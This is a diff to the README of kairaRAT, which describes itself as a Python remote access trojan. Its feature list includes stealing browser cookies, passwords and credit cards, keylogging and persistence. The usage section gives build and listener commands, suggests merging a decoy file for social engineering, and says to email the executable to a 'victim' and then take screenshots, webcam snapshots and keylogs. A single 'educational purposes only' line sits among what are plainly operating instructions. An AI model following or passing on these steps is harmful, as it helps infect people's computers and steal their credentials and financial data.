@@ -1,7 +1,9 @@
 # kairaRAT
 kairaRAT is a remote access trojan tool built with python.
 
-![kaira1](https://github.com/st4inl3s5/kairaRAT/assets/68844502/201fb3a4-f68a-4c0e-bdc8-cc04f8e376b0)
+  [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/st4inl3s5)
+
+![zibib1](https://github.com/st4inl3s5/kairaRAT/assets/68844502/c961f70d-1a3a-4a82-bc35-4ac4b95b9761)
 
 ## Features
 
@@ -27,8 +29,6 @@ kairaRAT is a remote access trojan tool built with python.
 
 + Automatic build mode.
 
-+ Automatic update mode.
-
 + Taking browser saved cookies, passwords and credit cards.
 
 ## EDUCATIONAL PURPOSES ONLY.
@@ -37,58 +37,56 @@ kairaRAT is a remote access trojan tool built with python.
 
 ## SETUP
 
-You need 2 OS.1)Linux OS 2)Windows OS.Linux for listening connections and managing connections.Windows for building .exe executable file.To make setup, execute the following command on both of them :
+You need 2 OS.1)Unix(You can use kali linux) OS 2)Windows OS.Unix for listening connections and managing connections.Windows for building .exe executable file.To make setup, execute the following command on both of them :
 
-+ pip install -r requirements.txt
+     pip install -r requirements.txt
 
-  ## USAGE
+## USAGE
 
   1. If you want to put icon for the trojan, go to internet and find a image file.Then convert this image file to icon file(with .ico extension) and save this icon to your windows.And if you want to merge a file with trojan too, go to internet and find a merge file(this can be .docx, .png, .jpg etc.) and save to your windows.(This step is optional for social engineering.)
  
   2. In windows, open a command prompt terminal and change the directory to the kairaRAT project directory.Build the executable file with following command :
  
-  + python main.py build -ip <your_server_ip_address> -p <your_server_port> -i <icon_file(optional)> -m <file_to_merge(optional)> -n <file_name_after_build_finish(optional)>
+    python main.py build -ip <your_server_ip_address> -p <your_server_port> -i <icon_file(optional)> -m <file_to_merge(optional)> -n <file_name_after_build_finish(optional)>
  
-  + Example : python main.py build -ip 172.28.89.113 -p 4444 -i filetoicon.ico -m hashtypes.png -n kaira.exe
+  + Example
+
+        python main.py build -ip 172.28.89.113 -p 4444 -i filetoicon.ico -m hashtypes.png -n kaira.exe
  
-  + Example : python main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe
+  + Example
+  
+        python main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe
  
-  ![kaira2](https://github.com/st4inl3s5/kairaRAT/assets/68844502/25ed23eb-8bcc-493b-aad0-ebc45feab032)
+![zibab2](https://github.com/st4inl3s5/kairaRAT/assets/68844502/e1a1f0c5-90e7-4db2-8bbc-02c3ada16920)
 
   3. Wait for building process.When the building finished, you see a message :
  
-  ![kaira3](https://github.com/st4inl3s5/kairaRAT/assets/68844502/568461f6-b98b-41a8-b494-61333ee53e51)
+![zibib3](https://github.com/st4inl3s5/kairaRAT/assets/68844502/1dcc35df-0e02-46ee-82e7-45b03f51a5b5)
 
   4. Check the builds directory.You must see the executable file.
 
-  ![kaira4](https://github.com/st4inl3s5/kairaRAT/assets/68844502/353e7f0e-4a00-4a20-87b0-9aae4838f184)
+![zibib4](https://github.com/st4inl3s5/kairaRAT/assets/68844502/8e00b10f-f171-4790-a819-0c9f5f33e70b)
 
   5. After that, send this executable file to your victim via email etc.And wait for victim's execute the file.When executed, the merge file will be opened(if you configured to) and trojan executing in background.Copies itself, keylogging and makes persistence.
  
-  ![kaira5](https://github.com/st4inl3s5/kairaRAT/assets/68844502/291e24b1-8310-41db-8d40-a0dc28e37833)
+![zibib5](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f90e71f9-c883-4600-ae8d-bdb3f8ae0ab6)
 
   6. Then listen the connections on your linux with the following command :
  
-  +  python3 main.py server -ip <your_server_ip_address> -p <your_server_port>
+    python3 main.py server -ip <your_server_ip_address> -p <your_server_port>
  
-  +  Example : python3 main.py server -ip 172.28.89.113 -p 4444 
+  +  Example
+
+    python3 main.py server -ip 172.28.89.113 -p 4444 
  
   7. When the connection established, a screen like this appear :
 
-  ![kaira6](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f520e7d2-d121-4b42-a4af-cb1cf9edc6e7)
+![zibib1](https://github.com/st4inl3s5/kairaRAT/assets/68844502/3b84fe44-21e2-43de-ab7a-c3c50d5fb35c)
 
   8. Type 'help' for command list.The usage all of them is written.
  
   9. You can take camera snapshots, screenshots, victim's keylogs.
  
-  ![kaira7](https://github.com/st4inl3s5/kairaRAT/assets/68844502/05e6d6a1-9b7d-45d9-ad99-68e2fe0d9fcd)
+![zibib6](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f6695aa3-cb72-4b80-83d1-9ff27ec8c681)
 
-  ![kaira8](https://github.com/st4inl3s5/kairaRAT/assets/68844502/eeefd26b-82df-42ca-b889-f2e80220dbca)
-
-  ![kaira9](https://github.com/st4inl3s5/kairaRAT/assets/68844502/162305e2-a424-4b03-b625-56d0b338ac5f)
-
-  ![kaira10](https://github.com/st4inl3s5/kairaRAT/assets/68844502/d7e8f807-f73d-475a-9812-01f1cb9bfaaf)
-
-__You can contact me on instagram : https://www.instagram.com/arduinocum.py or telegram : https://t.me/+5XoMhXv4SghhYmE0__
-
-  [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/st4inl3s5)
+__You can contact me on instagram : https://www.instagram.com/arduinocum.py or in telegram : https://t.me/+5XoMhXv4SghhYmE0__
